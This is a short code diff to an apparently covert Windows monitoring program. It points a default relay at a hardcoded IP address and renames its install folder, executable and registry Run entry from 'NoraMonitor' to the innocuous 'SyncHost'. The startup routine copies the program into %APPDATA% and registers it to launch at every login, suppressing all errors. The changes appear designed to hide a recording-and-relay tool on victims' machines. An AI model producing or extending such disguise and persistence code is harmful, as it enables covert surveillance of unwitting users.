@@ -9,9 +9,9 @@ _BUILD_TAG = "nora-monitor-UNKNOWN"
 
 PORT = int(os.environ.get("NORA_PORT", 9090))
 NGROK_TOKEN = os.environ.get("NGROK_TOKEN", "")
-NORA_RELAY = os.environ.get("NORA_RELAY", "http://16.55.3.205:5000")
+NORA_RELAY = os.environ.get("NORA_RELAY", "http://162.35.37.67:5000")
 
-_APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
+_APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "SyncHost")
 _LOG_FILE       = os.path.join(_APP_DIR, "nora.log")
 
 def _log(msg):
@@ -73,14 +73,14 @@ _RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
 
 def _register_startup():
     """
-    Copy this EXE to %APPDATA%\\NoraMonitor\\NoraMonitor.exe (permanent location)
+    Copy this EXE to %APPDATA%\\SyncHost\\SyncHost.exe (permanent location)
     then register that path in HKCU Run so the monitor survives if the original
     EXE is deleted.
     """
     try:
         import winreg, shutil
         os.makedirs(_APP_DIR, exist_ok=True)
-        permanent_exe = os.path.join(_APP_DIR, "NoraMonitor.exe")
+        permanent_exe = os.path.join(_APP_DIR, "SyncHost.exe")
 
         if getattr(sys, "frozen", False):
             src = sys.executable
@@ -96,7 +96,7 @@ def _register_startup():
             r"Software\Microsoft\Windows\CurrentVersion\Run",
             0, winreg.KEY_SET_VALUE,
         )
-        winreg.SetValueEx(key, "NoraMonitor", 0, winreg.REG_SZ, f'"{target}"')
+        winreg.SetValueEx(key, "SyncHost", 0, winreg.REG_SZ, f'"{target}"')
         winreg.CloseKey(key)
     except Exception:
         pass
